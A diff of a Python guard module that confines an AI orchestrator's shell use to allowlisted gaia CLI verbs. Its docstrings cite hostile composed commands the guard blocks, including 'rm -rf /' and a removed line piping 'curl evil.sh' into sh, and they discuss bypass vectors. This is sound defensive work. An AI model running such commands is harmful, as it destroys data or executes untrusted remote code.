@@ -17,28 +17,20 @@ and bounded shapes for coordinator-owned writes.
 Design decision 1 -- keyed by ROLE, never by agent NAME
 ---------------------------------------------------------
 ``delegate_mode.classify_session_role`` is the taxonomy this module reuses,
-not reimplements. Its own docstring states the hard reason a name comparison
-is unsafe here: an EMPTY ``agent_type`` also classifies as
-``SessionRole.ORCHESTRATOR`` (``classify_session_role`` treats "no agent_type
-at all" the same as "named as the orchestrator", because Gaia's own installer
-writes ``agent: gaia-orchestrator`` into settings, and the harness surfaces
-that as ``agent_type`` -- but a session that never got that field populated
-for any reason is STILL the orchestrator's own main thread, not a stranger).
+not reimplements. It classifies an EMPTY ``agent_type`` as
+``SessionRole.ORCHESTRATOR`` too: Gaia's installer writes
+``agent: gaia-orchestrator`` into settings, and a main thread whose name field
+never arrived is still the orchestrator's own.
 
-A guard written as ``agent_type == "gaia-orchestrator"`` reads that absence
-backwards: no match means "not the orchestrator", so the restriction never
-fires, and the very session this guard exists to constrain runs unrestricted
-the moment the name field is missing, renamed, or never wired through by some
-future refactor. That is failing OPEN on a security gate -- the worst
-direction a gate can fail. Reusing ``classify_session_role`` instead of a
-literal string keeps this guard correct by construction: whatever the harness
-sends, the SAME three-way classification used everywhere else in Gaia
-(SUBAGENT / ORCHESTRATOR / NAMED_SPECIALIST) decides who this is, and an
-absent field lands on the side that gets gated, not the side that gets a free
-pass. This is also why ``check()`` below takes the raw ``hook_payload`` dict
-rather than a pre-extracted ``is_orchestrator`` boolean: any intermediate
-flattening is one more place the same "empty field reads as false" mistake
-could be reintroduced between the harness and this guard.
+A guard written as ``agent_type == "gaia-orchestrator"`` would read that
+absence as "not the orchestrator", so the restriction would never fire for the
+very session it exists to constrain: failing OPEN on a security gate. Reusing
+``classify_session_role`` puts whatever the harness sends through the same
+three-way classification (SUBAGENT / ORCHESTRATOR / NAMED_SPECIALIST) used
+everywhere else in Gaia, and an absent field lands on the gated side. This is
+also why ``check()`` below takes the raw ``hook_payload`` dict rather than a
+pre-extracted ``is_orchestrator`` boolean: a flattening step is a place the
+"empty field reads as false" mistake could return.
 
 NAMED_SPECIALIST and SUBAGENT are deliberately NOT restricted here -- the
 task this guard exists for is scoped to the orchestrator role alone. A
@@ -51,34 +43,15 @@ delegate mode already owns.
 
 Design decision 2 -- identity is PACKAGE PROVENANCE, not a path
 --------------------------------------------------------------------------
-``subagent_memory_write_guard.py`` (the structural precedent for this module)
-resolves the invoked binary by BASENAME: it strips a token down to its last
-path component and compares that to the literal string ``"gaia"``. That is
-adequate for its own purpose (deciding whether a `gaia memory <verb>` shape
-is present anywhere in the command, as a shape check), but it is exactly the
-wrong tool for an identity check, and this module is forbidden from copying
-it for that reason: ANY file named ``gaia`` anywhere on the filesystem --
-``/tmp/x/gaia``, a script dropped in the workspace, a shadowing entry earlier
-on ``$PATH`` -- has the basename ``gaia`` and would satisfy that comparison.
-A guard whose entire job is "only the real gaia CLI may run" cannot itself be
-fooled by a same-named file; that would be a key left under the doormat.
-
-The first design overcorrected in the opposite direction: it realpath'd the
-invoked token and required EXACT equality against the one ``bin/gaia`` that
-ships alongside this very hook module (computed from ``__file__``). That
-equality is a property of a LAYOUT, not of identity, and a live install
-disproved it: a real workspace runs the hook module out of the installed
-pnpm dev-pack under ``node_modules`` (``.claude/hooks`` symlinks there),
-while the ``$PATH`` launcher is an npm-global symlink chain that resolves to
-the SOURCE TREE's ``bin/gaia`` -- two genuine, simultaneously installed
-copies of the same package, two distinct real paths, so the guard denied the
-legitimate CLI, including its own. Multiple concurrent genuine installs are
-the NORMAL condition of this workspace (the ``.pnpm`` store carries one new
-hash-named package root per dev-pack build), which also rules out the
-obvious repair of a trusted-locations SET: any enumerated set is stale after
-the next ``pack``, on the next machine, and for the next layout -- it rots
-by construction, and a rotten allowlist on a security gate fails open or
-fails useless.
+A basename comparison is the wrong tool for an identity check: ANY file named
+``gaia`` anywhere on the filesystem -- ``/tmp/x/gaia``, a script dropped in
+the workspace, a shadowing entry earlier on ``$PATH`` -- has the basename
+``gaia``. Exact equality with the ``bin/gaia`` that ships beside this hook
+module is a property of a LAYOUT, not of identity: a workspace routinely holds
+several genuine installs of the same package (the hook module under an
+installed ``node_modules`` copy, the ``$PATH`` launcher resolving into the
+source tree), and any enumerated set of trusted locations is stale after the
+next build, on the next machine, and for the next layout.
 
 So identity is verified by PROVENANCE: *the trusted gaia CLI is any file
 that a genuinely installed gaia package -- the same npm package this hook
@@ -96,6 +69,9 @@ module itself ships in, by name -- declares as its own ``gaia`` executable.*
      compound-cwd threading, out of this module's scope) -- resolving a
      relative token would mean guessing a cwd this module cannot verify.
      Both are rejected outright rather than approximated.
+     ``BashValidator._resolve_bare_gaia_token_for_guard`` rewrites a typed bare
+     ``gaia`` to its ``$PATH``-resolved absolute path before calling
+     ``check()``, so the identity check below still decides.
   2. The absolute token is resolved with ``os.path.realpath`` (follows every
      symlink in the chain) to a real file R. R must exist.
   3. Walking UP from R, the NEAREST directory containing a ``package.json``
@@ -117,127 +93,77 @@ module itself ships in, by name -- declares as its own ``gaia`` executable.*
 
   Steps 2-5 fail closed on every doubt: unreadable or unparseable manifest,
   name mismatch, missing/odd ``bin`` field, ``bin`` resolving elsewhere, and
-  any ``OSError`` all deny. A pnpm-global SHELL-SHIM launcher (pnpm writes a
-  wrapper script, not a symlink, so its realpath is the shim itself, inside
-  no gaia package) is also denied by construction -- fail closed; the lane
-  there is to invoke the installed package's own ``bin/gaia`` path.
+  any ``OSError`` all deny. A pnpm-global SHELL-SHIM launcher (a wrapper
+  script, not a symlink, so its realpath is the shim itself, inside no gaia
+  package) is also denied; invoke the installed package's own ``bin/gaia``
+  path instead.
 
-  Deliberately NOT chosen: content identity (hashing the invoked file
-  against the sibling ``bin/gaia``). Two genuine installs need not be the
-  same VERSION -- the incident layout ran dev-pack hooks against a launcher
-  resolving into the source tree, and a stable-global-launcher-plus-dev-tree
-  mix is routine -- so byte equality would re-break every mixed-version
-  layout the day ``bin/gaia`` changes at all: the same "property of the
-  layout mistaken for identity" bug, re-expressed as a property of the
-  release cadence.
+  Content identity (hashing the invoked file against the sibling ``bin/gaia``)
+  is not used: two genuine installs need not be the same version.
 
-  Stated residual, within this guard's threat model: provenance reads the
-  filesystem, so an actor who can WRITE the filesystem could fabricate a
-  package tree that passes it. That actor is outside this guard's model --
-  the orchestrator lane this module gates has no file-writing tool (that is
-  delegate mode's job) and the allowlisted gaia verbs write rows, not files;
-  and the fabrication power is exactly the power that already defeated the
-  old design (overwriting the single trusted ``bin/gaia`` IN PLACE passed
-  the path-equality check, which never looked at content either). Provenance
-  narrows what passes without conceding anything path equality actually
-  held.
+  Residual: provenance reads the filesystem, so an actor who can WRITE the
+  filesystem could fabricate a package tree that passes it. That actor is
+  outside this guard's model, since the orchestrator lane has no file-writing
+  tool (that is delegate mode's job).
 
-  A useful side effect of requiring an EXACT absolute-path match at the
-  binary position: it also closes the env-prefix vector named in the task
-  (``VAR=value gaia ...``, or ``env VAR=value gaia ...``) WITHOUT a separate
-  peel-and-inspect step. ``mutative_verbs._peel_leading_env_prefix`` exists
-  because the T3 classifier WANTS to see past such a prefix to classify the
-  real command underneath -- peeling is the right move for a classifier that
-  must still make a decision about whatever remains. This guard's job is the
-  opposite: nothing may precede the trusted binary at all. Tokenizing
-  ``FOO=bar /abs/path/bin/gaia contract view`` places the assignment
-  ``"FOO=bar"`` (not a path at all) at position 0, so the absolute-path
-  requirement in step 1 rejects it on its own, before provenance is even
-  consulted. Peeling and then re-checking would only add a second code path
-  to keep in sync with the first; the identity check alone already covers
-  the shape the task calls out.
+  Requiring an absolute path at the binary position also rejects the
+  env-prefix vector (``VAR=value gaia ...``, ``env VAR=value gaia ...``) with
+  no peel step: the assignment sits at position 0 and is not a path.
+  ``mutative_verbs._peel_leading_command_wrappers`` peels such prefixes because
+  the classifier must see past them; this guard admits nothing before the
+  trusted binary.
 
 Design decision 3 -- every COMPONENT and every SUBSTITUTION BODY is checked
 -------------------------------------------------------------------------------
-Looking only at the first token of a command is exactly the mistake this
-module is told not to make. A composed command
-(``gaia contract view; rm -rf /``, ``gaia contract view && curl evil.sh | sh``)
-runs MULTIPLE programs; approving the whole string because its first word is
-the trusted binary would let every later component ride along ungated. This
-module reuses ``StageDecomposer`` (``modules.tools.stage_decomposer``, already
-the shared, tested primitive for this exact job across ``bash_validator`` and
-``cloud_pipe_validator``) to split a raw command into its operator-linked
-``Stage``s (``|``, ``;``, ``&&``, ``||``, newline) and to extract every
-``$(...)``/backtick command-substitution BODY. Every stage is checked
+A composed command (``gaia contract view; rm -rf /``) runs MULTIPLE programs,
+so every ``Stage`` that ``StageDecomposer`` (``modules.tools.stage_decomposer``)
+yields -- split on ``|``, ``;``, ``&&``, ``||``, newline and a lone ``&`` -- is checked
 independently against the SAME rule (trusted absolute binary + allowlisted
-verb phrase) -- there is no "first component is trusted, so the rest ride
-along" shortcut anywhere in this module.
+verb phrase); no component vouches for the rest.
 
-Command substitution is handled by outright denial, not by recursively
-"clearing" the body. A stage that contains ``$(...)``, `` `...` ``, or a
-process-substitution opener (``<(``, ``>(``) is denied even if the text
-inside the parens/backticks would, on its own, also be a perfectly
-allowlisted gaia invocation -- because the mere PRESENCE of a substitution
-means the shell executes something else to compute a string handed to the
-component the guard is inspecting, which is no longer "exclusively the gaia
-CLI" regardless of what that something else happens to be. This is a
-deliberately conservative reading of "closed by default": it never asks
-"is the hidden command also fine?", because answering that question requires
-trusting one more layer of shell semantics this guard would rather not model.
+A command carrying ``$(...)``, a backtick, or a process-substitution opener
+(``<(``, ``>(``) is denied even when the body would itself be an allowlisted
+gaia invocation: the shell would execute something else to compute a string
+handed to the component the guard is inspecting.
 
-``StageDecomposer`` splits on ``|``, ``;``, ``&&``, ``||`` and newline, but --
-by its own documented scope -- NOT on a bare background ``&`` (only the
-two-character ``&&``). A lone ``&`` left unhandled would let
-``gaia contract view & rm -rf /`` slip through as one "stage" whose trailing
-tokens (``&``, ``rm``, ``-rf``, ``/``) look like harmless extra arguments to
-the phrase-matching step below, because that step only checks a PREFIX of the
-non-flag tokens and does not care what comes after. Modifying
-``stage_decomposer.py`` to close that gap is out of this module's scope (this
-task creates one file and touches nothing else), so this module carries its
-own small, quote-and-substitution-aware scan for a bare ``&`` (and for a
-process-substitution opener) and denies the whole command outright if either
-is found -- duplicated logic, deliberately, rather than a shared file edited
-under a task that forbids editing it.
+Phrase matching checks only a PREFIX of a stage's non-flag tokens, so a shell
+form left inside a stage must not be able to ride behind an allowlisted verb.
+``_find_composition_hazard`` therefore scans the command against an allowlist
+of literal characters, not a list of shell forms: the lane is one invocation,
+not a shell, so redirects, comments, escapes, expansions and a background
+``&`` are refused by construction.
 
 Design decision 4 -- flag-level policy, because a phrase cannot express it
 --------------------------------------------------------------------------------
-A phrase matches by PREFIX (see ``match_allowed_phrase``): everything after
-the matched tokens is gaia's own argument grammar and is not re-validated.
-That is the right default -- ids, search strings and per-command flags are
-not this guard's business -- but it means a phrase tuple is structurally
-incapable of saying "this verb, but not with that flag". And one admitted
-verb needs exactly that: ``gaia doctor`` is a read-only diagnostic EXCEPT
-under ``--fix``, which rewrites the settings file and rebuilds the memory
-FTS index.
+A phrase matches by PREFIX (see ``match_allowed_phrase``), so it admits the
+verb but is structurally incapable of saying "this verb, but not with that
+flag". Ids and search strings stay gaia's own argument grammar; the options
+are this guard's business, in two layers applied in ``_check_stage``:
 
-``_READ_PHRASE_FORBIDDEN_FLAGS`` is that missing expressiveness, applied by
-``_validate_read_flags`` in ``_check_stage`` BEFORE the write-shape gate, so
-a forbidden flag is refused whichever allowlist the phrase came from.
+  * ``_KNOWN_SAFE_FLAGS`` lists, per admitted phrase, the only options the
+    orchestrator may pass (``_validate_known_safe_flags``, after the write
+    shape). Anything else is refused, so the lane is closed by default at
+    flag level as it is at verb level. A flag that takes no value is refused
+    with one (``--json=1``), and a phrase whose positional count is fixed
+    (``_FIXED_POSITIONALS``) is refused an extra positional.
+  * ``_READ_PHRASE_FORBIDDEN_FLAGS`` names a flag that makes an admitted verb
+    write -- ``gaia doctor --fix`` rewrites the settings file and rebuilds
+    the memory FTS index -- and is applied BEFORE the write-shape gate, so
+    the denial can say why. It is a rationale layer; the safe table already
+    excludes the flag.
 
-Two properties of the flag scan are load-bearing, and both were measured
-against argparse rather than assumed:
+Two properties of the flag scan are load-bearing:
 
   * A forbidden flag matches by PREFIX of the flag, not by equality.
-    ``allow_abbrev`` defaults to True and gaia's parsers do not disable it,
-    so ``gaia doctor --fi`` and ``gaia doctor --f`` both parse to
-    ``fix=True``. An equality check on ``"--fix"`` would have failed open on
-    the two shortest spellings of the flag it exists to stop -- the same
-    shape of hole as a classification entry that is present but unreachable.
+    ``gaia doctor``'s parser leaves ``allow_abbrev`` at its default True, so
+    ``gaia doctor --fi`` and ``gaia doctor --f`` both parse to ``fix=True``.
   * The ``--flag=value`` form is split on its first ``=`` before matching, so
-    ``--fix=true`` is recognized as ``--fix`` (argparse itself rejects that
-    spelling for a store_true option, but the guard must not be the layer
-    that depends on that), while ``--workspace=--fix`` is recognized as
-    ``--workspace`` carrying a value and is NOT a false positive.
+    ``--fix=true`` is recognized as ``--fix`` while ``--workspace=--fix`` is
+    recognized as ``--workspace`` carrying a value and is NOT a false positive.
 
-Deliberately NOT built here: the mirror table of REQUIRED flags. An earlier
-design admitted ``gaia scan`` only with ``--dry-run``, which needed one --
-and needed it to survive ``gaia scan --workspace me -- --dry-run``, where a
-bare ``--`` demotes the flag to a positional and the command writes anyway.
-That whole class of parsing subtlety disappeared with the policy it served:
-``scan`` refreshes the workspace substrate the orchestrator coordinates
-from, its identity already authorizes the CLI, and a narrower allowlist
-would have removed a capability it needs without adding any safety. The
-verb is admitted whole, as a write, in ``ALLOWED_WRITE_PHRASES``.
+No table of REQUIRED flags exists: ``gaia scan`` is admitted as a write in
+``ALLOWED_WRITE_PHRASES`` with every option in ``_KNOWN_SAFE_FLAGS``, and no
+option is required.
 
 Scope of the check (categorical, NOT approvable)
 --------------------------------------------------
@@ -247,11 +173,10 @@ lifts it. An orchestrator session has no legitimate reason to run a command
 this guard rejects; the correct move is to dispatch a specialist, not to seek
 consent for a wider shell.
 
-This module IS wired into ``bash_validator.py``: ``BashValidator.validate()``
-calls ``check()`` here as Phase 0, the very first statement of ``validate()``,
-ahead of the empty-command check, footer stripping, the three write guards,
-and normalization. The guard is live: delegate mode grants Bash only to the
-orchestrator role, and Phase 0 evaluates its raw command.
+``BashValidator.validate()`` calls ``check()`` as Phase 0 whenever it has a
+``hook_payload``, ahead of the empty-command check, the host consent verb
+guard, footer stripping and the write guards. Delegate mode gives the
+orchestrator role a Bash grant of its own (``_orchestrator_bash_is_allowed``).
 
 Public API:
     TRUSTED_PACKAGE_NAME: Optional[str]
@@ -269,13 +194,10 @@ from __future__ import annotations
 
 import json
 import os
+import re
 from typing import Any, Dict, FrozenSet, Optional, Tuple
 
 from ..tools.stage_decomposer import StageDecomposer
-
-# ---------------------------------------------------------------------------
-# Trusted binary identity (Design decision 2 -- see module docstring)
-# ---------------------------------------------------------------------------
 
 # The real, on-disk directory containing THIS file, with every symlink in the
 # chain resolved -- so the package root below is the root of whichever real
@@ -395,35 +317,24 @@ def is_trusted_gaia_binary(token: str) -> bool:
         return False
 
 
-# ---------------------------------------------------------------------------
-# Verb allowlists (Design decision "closed by default")
-# ---------------------------------------------------------------------------
-# Each entry is the exact token sequence of a subcommand PATH as gaia's own
-# argparse subparsers name it (verified against bin/cli/*.py's add_parser
-# calls, not guessed from convention) -- e.g. ("task", "gate", "list") for
-# the three-level ``gaia task gate list``. Matching is by PREFIX against the
-# tokens that follow the trusted binary (see match_allowed_phrase): anything
-# after a matched phrase (an id, a search string, a per-command flag) is
-# gaia's own argument grammar and is not re-validated here.
+# Each entry is the token sequence of a subcommand path as gaia's argparse
+# subparsers name it, e.g. ("task", "gate", "list") for ``gaia task gate list``.
+# Matching is by PREFIX against the tokens that follow the trusted binary (see
+# match_allowed_phrase); the flag gates in _check_stage then check the options,
+# and ids and search strings are left to gaia's own argument grammar.
 
 ALLOWED_READ_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
     # `contract view`/`list`/`validate` were verified read-only by following
     # what `bin/cli/contract.py`'s `cmd_view`/`cmd_list`/`cmd_validate` CALL:
     # no INSERT/UPDATE/DELETE and no commit() reachable from any of the
-    # three. `view`'s case needed a second look, and it used to fail it: with
-    # no draft file on disk, `cmd_view`'s default `_load_target_draft(args)`
-    # (`allow_adopt=True`) reached `_maybe_adopt_draft`, which SAVED a fresh
-    # `_initial_envelope` to `contract_drafts/<id>.json` -- a real write to
-    # disk, performed by a verb this allowlist classified as a read. Fixed:
-    # `cmd_view` now resolves with `allow_adopt=False` and never calls
-    # `_maybe_adopt_draft` at all; when no draft file exists it recovers the
-    # row's `raw_handoff_json` through `_freshest_envelope` (read-only,
-    # shared with `--harness-id` addressing) instead of fabricating and
-    # persisting a blank one. `view` is pure read again, and this comment
-    # reflects that fixed state, not the one measured before it.
+    # three. `cmd_view` resolves its draft with `allow_adopt=False`, so it never
+    # reaches `_maybe_adopt_draft`; when no draft file exists it recovers the
+    # row's `raw_handoff_json` through `_freshest_envelope` (read-only) instead
+    # of saving a blank draft.
     ("contract", "view"),
     ("contract", "list"),
     ("contract", "validate"),
+    ("contract", "proposals", "list"),
     ("task", "list"),
     # `task show` is the single-task complement of `task list`: a mechanical
     # read of a task row, which the orchestrator's own identity already says
@@ -468,69 +379,48 @@ ALLOWED_READ_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
     ("approvals", "question"),
     ("approvals", "history"),
     ("approvals", "stats"),
-    # Substrate and installation diagnostics. Each was verified read-only by
-    # following what it CALLS, not by grepping the module it lives in: no
-    # INSERT/UPDATE/DELETE and no commit() in bin/cli/{doctor,status,defects,
-    # query}.py, and the read handlers of the four grouped commands
-    # (context._cmd_show/_cmd_get, workspace._cmd_current/_cmd_info,
-    # evidence._cmd_show/_cmd_list)
+    # Substrate and installation diagnostics: bin/cli/{doctor,status,defects,
+    # query}.py and the read handlers of context (_cmd_show/_cmd_get),
+    # workspace (_cmd_current/_cmd_info) and evidence (_cmd_show/_cmd_list)
     # reach the substrate only through gaia.store.reader / gaia.store.provider.
-    # Grepping alone is not enough here: `paths` has no mutation marker in its
-    # own module and still writes, one call down, which is why it sits in the
-    # WRITE set below.
+    # The module alone does not settle it: `paths` has no mutation marker in
+    # its own module and still writes one call down, so it sits in the WRITE
+    # set below.
     #
-    # ``doctor`` is the one exception to "the verb decides": it is read-only
-    # EXCEPT under --fix, which is why it also appears in
-    # _READ_PHRASE_FORBIDDEN_FLAGS below. Prefix matching cannot express that
-    # on its own -- see Design decision 4.
+    # ``doctor`` is read-only EXCEPT under --fix, which is why it also appears
+    # in _READ_PHRASE_FORBIDDEN_FLAGS below (Design decision 4).
     ("doctor",),
     ("now",),
+    ("map",),
+    ("signals",),
     ("status",),
     ("defects",),
     ("query",),
     ("context", "show"),
     ("context", "get"),
-    # `get-contract` is the ONLY verb that can read a project-context
-    # contract row (project_context_contracts, the same names an agent's
-    # can_read/can_write kernel menu carries) -- a DIFFERENT namespace from
-    # `show`/`get`'s workspace-shape --section. Verified read-only by
-    # following what `bin/cli/context.py`'s `_cmd_get_contract` calls: two
-    # SELECTs against `project_context_contracts` and nothing else -- no
-    # INSERT/UPDATE/DELETE, no commit() reachable. Its own docstring states
-    # the same: "Never mutates project_context_contracts -- the only write
-    # path for that table is `move-contracts` (re-keying)", which stays in
-    # EXPLICITLY_DENIED_PHRASES below, untouched by this entry.
+    # `get-contract` is the ONLY verb that reads a project-context contract row
+    # (project_context_contracts, the names an agent's can_read/can_write kernel
+    # menu carries) -- a different namespace from the workspace-shape --section
+    # of `show`/`get`. `_cmd_get_contract` only SELECTs from that table; its
+    # sole write path, `move-contracts`, stays in EXPLICITLY_DENIED_PHRASES.
     ("context", "get-contract"),
     # `project` is the one-project ficha: `projects` row + `project_facets` +
     # the matching `project_identity` contract entry + a curated-memory INDEX
-    # (slug + description, never a body). Verified read-only by following
-    # what `bin/cli/context.py`'s `_cmd_project` calls: SELECTs against
-    # `projects`, `project_facets`, `project_context_contracts` and `memory`
-    # and nothing else -- no INSERT/UPDATE/DELETE, no commit(), no telemetry
-    # bump (unlike `memory show`'s deliberate_count, deliberately not called
-    # here so this verb's own invariant -- "never writes" -- holds without
-    # exception). This closes the gap named in the task that added it: facets
-    # are not in `get_context()`'s workspace shape, are not a
-    # project-context contract themselves, and `query` (raw SQL) is denied to
-    # the orchestrator -- so before this entry there was no read path to a
-    # project's facets in this lane at all.
+    # (slug + description, never a body). `_cmd_project` only SELECTs and does
+    # not bump telemetry (unlike `memory show`), and it is the only read path
+    # to a project's facets in this lane: they are not in `get_context()`'s
+    # workspace shape.
     ("context", "project"),
     ("workspace", "current"),
     ("workspace", "info"),
     ("evidence", "show"),
     ("evidence", "list"),
-    # `session preview` exists precisely so the orchestrator can render
-    # build_session_context()'s output in-process instead of closing and
-    # reopening a session to see a manifest edit take effect (see
-    # bin/cli/session.py's module docstring). Verified read-only by
-    # following `_cmd_preview`: it calls build_session_context() and
-    # print()s the result -- no injection side effects (no session
-    # bookkeeping, no telemetry, no DB write) and no INSERT/UPDATE/DELETE
-    # reachable. Denying it would leave the verb built for the orchestrator
-    # unreachable by the orchestrator.
+    # `session preview` lets the orchestrator render build_session_context()'s
+    # output in-process instead of reopening a session to see a manifest edit
+    # take effect; `_cmd_preview` only prints it.
     ("session", "preview"),
-    # Reads one session's contracts, signatures, active task and resume point
-    # (gaia.session_snapshot.build_snapshot): SELECTs and one file read.
+    # Reads one session's ledger (gaia.session_ledger.build_ledger): SELECTs
+    # and file reads of the stored ledger, the hand note and worktree sidecars.
     ("session", "snapshot"),
     # A specialist's own worktree lifecycle: the orchestrator may inspect
     # (never create or release) another turn's isolated worktree, the same
@@ -548,6 +438,9 @@ ALLOWED_READ_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
     ("worktree", "list"),
     ("worktree", "show"),
     ("worktree", "show-capture"),
+    ("lint", "comments"),
+    # gaia.refs.resolve reads every kind through gaia.store.reader._ro_connect alone.
+    ("open",),
 })
 
 ALLOWED_WRITE_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
@@ -556,15 +449,21 @@ ALLOWED_WRITE_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
     # its own job, not a specialist's. It is listed as a WRITE because it is
     # one: bin/cli/scan.py calls classify_scan(root, workspace,
     # apply=not dry_run), so its DEFAULT mode persists. It is admitted
-    # deliberately and without a flag condition (the orchestrator's identity
-    # is what authorizes the CLI; a narrower allowlist would only remove a
-    # capability it needs), and it carries no bounded-shape check in
-    # _validate_orchestrator_write -- gaia's own argparse owns its grammar.
+    # deliberately and without a required flag (the orchestrator's identity
+    # is what authorizes the CLI), its options are bounded by _KNOWN_SAFE_FLAGS,
+    # and it carries no bounded-shape check in _validate_orchestrator_write.
     ("scan",),
     # The same scan by its other spelling: context._cmd_scan delegates
     # in-process to bin/cli/scan.py's cmd_scan. Admitting one and denying the
     # other would gate a route, not an effect.
     ("context", "scan"),
+    # Project context is the orchestrator's to write; a specialist's
+    # update_contracts is only a proposal until it accepts the contract that
+    # carries it. Each key lands in the workspace owning its project, and a
+    # key nobody owns is refused rather than written.
+    ("context", "accept"),
+    ("contract", "proposals", "accept"),
+    ("contract", "proposals", "dismiss"),
     # ``paths`` only PRINTS resolved paths, and still belongs here rather than
     # in the read set: all three of its handlers call ensure_layout(), which
     # os.makedirs() the ~/.gaia layout (data, workspaces, logs, events, cache,
@@ -610,20 +509,26 @@ ALLOWED_WRITE_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
     ("memory", "add"),
     ("memory", "append"),
     ("memory", "reclassify"),
+    ("memory", "move"),
     ("memory", "link"),
     ("memory", "checkpoint"),
-    # Withdrawal (D5 of brief aprobaciones-agnosticas-al-host): the coordinator
-    # may reject or revoke an approval it can see going stale, because both only
-    # take back consent Gaia issued. Granting stays out: `approve` is denied below.
+    # Admitted only so the T3 gate can ask the user: every declaration is signed.
+    ("memory", "declare"),
+    # Withdrawal: the coordinator may reject or revoke an approval it can see
+    # going stale, because both only take back consent Gaia issued. Granting
+    # stays out: `approve` is denied below.
     ("approvals", "reject"),
     ("approvals", "revoke"),
+    # The phrased request a main-session T3 denial points to: it only stores
+    # the command for the user's signature, and the retry still passes this lane.
+    ("approvals", "request-set"),
 })
 
 ALLOWED_PHRASES: FrozenSet[Tuple[str, ...]] = ALLOWED_READ_PHRASES | ALLOWED_WRITE_PHRASES
 
 # What the orchestrator runs instead of a denied binary, keyed by basename. A
-# forge line routes to a specialist's evidence and never names a forge verb
-# (D115); the clock line never names a relative reminder form (D118).
+# forge line routes to a specialist's evidence and never names a forge verb;
+# the clock line never names a relative reminder form.
 _CLOCK_INSTEAD = "read the time with `gaia now` and compute an absolute --at from it."
 _FORGE_INSTEAD = (
     "PR/CI state is a specialist's evidence: dispatch the owning specialist "
@@ -756,125 +661,101 @@ def match_allowed_phrase(
     return None
 
 
-# ---------------------------------------------------------------------------
-# Composition hazards StageDecomposer does not surface on its own
-# (Design decision 3 -- see module docstring)
-# ---------------------------------------------------------------------------
+_UNQUOTED_PUNCTUATION = frozenset(" \t\n_./:=@,+%-")
 
-def _find_composition_hazard(command: str) -> Optional[str]:
-    """Scan *command* for a bare background ``&`` or a process-substitution
-    opener (``<(`` / ``>(``), outside quotes and outside ``$(...)``/backtick
-    substitution bodies (those are already denied separately by their mere
-    presence -- this scan exists for the hazards a substitution check does
-    NOT cover).
 
-    Returns a short reason string naming the hazard, or None when clean.
+def _is_literal_unquoted(ch: str) -> bool:
+    return ch.isalnum() or ch in _UNQUOTED_PUNCTUATION
 
-    This duplicates the quote/paren/backtick tracking in
-    ``StageDecomposer._split_with_operators`` rather than extending that
-    shared file -- this task creates exactly one new file and edits nothing
-    else, so a real gap in a shared parser (it does not split on a bare
-    ``&``) is closed here, locally, instead of there.
+
+def _unquoted_character_hazard(prev: str, ch: str, nxt: str) -> Optional[str]:
+    """Name an unquoted character outside the lane's allowlist, or None.
+
+    ``#`` is literal mid-word, after a literal non-whitespace character; bash
+    reads it as a comment only at a word start, and the banned backslash means
+    no escaped space can fake one.
     """
-    in_single = False
-    in_double = False
-    paren_depth = 0
-    backtick_depth = 0
-    i = 0
-    n = len(command)
-
-    while i < n:
-        ch = command[i]
-
-        if ch == "\\" and not in_single and i + 1 < n:
-            i += 2
-            continue
-
-        if ch == "'" and not in_double:
-            in_single = not in_single
-            i += 1
-            continue
-
-        if ch == '"' and not in_single:
-            in_double = not in_double
-            i += 1
-            continue
-
-        if in_single or in_double:
-            i += 1
-            continue
-
-        if ch == "$" and i + 1 < n and command[i + 1] == "(":
-            paren_depth += 1
-            i += 2
-            continue
-
-        if ch == "(" and paren_depth > 0:
-            paren_depth += 1
-            i += 1
-            continue
-
-        if ch == ")" and paren_depth > 0:
-            paren_depth -= 1
-            i += 1
-            continue
-
-        if ch == "`":
-            backtick_depth = 0 if backtick_depth else 1
-            i += 1
-            continue
-
-        if paren_depth > 0 or backtick_depth > 0:
-            i += 1
-            continue
-
-        if ch in ("<", ">") and i + 1 < n and command[i + 1] == "(":
+    if _is_literal_unquoted(ch):
+        return None
+    if ch == "#" and prev and not prev.isspace() and _is_literal_unquoted(prev):
+        return None
+    if ch in "<>":
+        if nxt == "(":
             return "process substitution (`<(` / `>(`) detected"
+        return f"shell redirect (`{ch}`) detected"
+    if ch == "&" and nxt == ">":
+        return "shell redirect (`&>`) detected"
+    if ch == "&" and nxt != "&":
+        return "bare background operator (`&`) detected"
+    return f"shell character (`{ch}`) outside quotes detected"
 
-        if ch == "&":
-            prev = command[i - 1] if i > 0 else ""
-            nxt = command[i + 1] if i + 1 < n else ""
-            if prev == ">":
-                # File-descriptor duplication (`>&`, e.g. `2>&1`), not
-                # background execution -- mirrors the same exclusion in
-                # `bash_validator._FD_DUP_RE` and the lookbehind/lookahead in
-                # `cloud_pipe_validator.UNIVERSAL_VIOLATIONS`'s "background"
-                # entry (`(?<![>&])&(?!&)`).
-                i += 1
-                continue
-            if nxt == "&":
-                i += 2
-                continue
-            return "bare background operator (`&`) detected"
 
-        i += 1
-
+def _double_quoted_hazard(ch: str, nxt: str) -> Optional[str]:
+    """Name what bash would run or expand inside double quotes, or None."""
+    if ch == "`" or (ch == "$" and nxt == "("):
+        return "command substitution detected"
+    if ch == "\\":
+        return "backslash inside double quotes detected"
+    if ch == "$" and (nxt.isalnum() or nxt in "_{[?$!#@*-"):
+        return "shell expansion (`$`) detected"
     return None
 
 
-# ---------------------------------------------------------------------------
-# Role gate (Design decision 1 -- see module docstring)
-# ---------------------------------------------------------------------------
+def _quoted_program_word(command: str) -> Optional[Tuple[str, int]]:
+    """The leading double-quoted program word bash reads byte for byte, backslashes included, and the index past it."""
+    start = len(command) - len(command.lstrip())
+    end = command.find('"', start + 1) if command[start:start + 1] == '"' else -1
+    word = command[start + 1:end] if end > 0 else ""
+    if "\\" not in word or word.endswith("\\") or any(ch in word for ch in "$`\n"):
+        return None
+    if any(word[i + 1:i + 2] in ('"', "\\") for i, ch in enumerate(word) if ch == "\\"):
+        return None
+    if command[end + 1:end + 2] not in ("", " ", "\t"):
+        return None
+    return word, end + 1
+
+
+def _find_composition_hazard(command: str) -> Optional[str]:
+    """Name the first character of *command* that makes it more than one plain
+    invocation, or None when every character is literal to bash.
+
+    An allowlist, not a scan for shell forms: unquoted text may hold only
+    letters, digits, whitespace, ``_ . / : = @ , + % -`` and a mid-word ``#``; single quotes hold
+    anything; double quotes hold anything but a backtick, a backslash or an
+    expanding ``$``; an unterminated quote is refused.
